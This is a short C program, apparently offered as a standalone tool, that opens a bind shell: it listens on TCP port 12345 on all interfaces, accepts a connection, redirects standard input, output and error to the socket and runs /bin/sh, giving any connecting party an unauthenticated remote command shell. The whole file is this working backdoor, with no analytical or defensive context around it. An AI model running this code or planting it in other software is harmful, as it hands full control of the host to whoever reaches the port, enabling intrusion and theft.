#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
// for simplicity we omit some error checks



int main(int argc,  char **argv){
        int new, sockfd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sin;
        int i;
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = 0;
        sin.sin_port = htons(12345);            // Open tcp port 12345
        if(bind(sockfd, (struct sockaddr *)&sin, sizeof(sin)) < 0)
                return 1;
        if(listen(sockfd, 5) < 0)
                return 1;
        new = accept(sockfd, NULL, 0);
        for(i = 2; i >= 0; i--)
                dup2(new, i);
        execl("/bin/sh", "sh", NULL);           //Remote conexion shell
}